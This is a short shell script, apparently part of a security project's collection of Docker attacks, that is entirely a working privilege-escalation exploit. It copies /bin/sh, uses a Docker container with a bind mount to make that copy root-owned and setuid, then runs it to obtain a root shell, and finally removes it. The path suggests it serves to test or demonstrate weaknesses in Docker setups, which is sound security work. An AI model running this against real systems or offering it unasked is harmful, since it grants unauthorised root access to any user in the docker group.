#!/bin/sh

cp /bin/sh .
docker run --rm -v /home/ubuntu/SecureWilly/Attacks/DockerGroup/:/host busybox /bin/sh -c "chown root:root /host/sh && chmod a+s /host/sh"
./sh
sudo rm ./sh

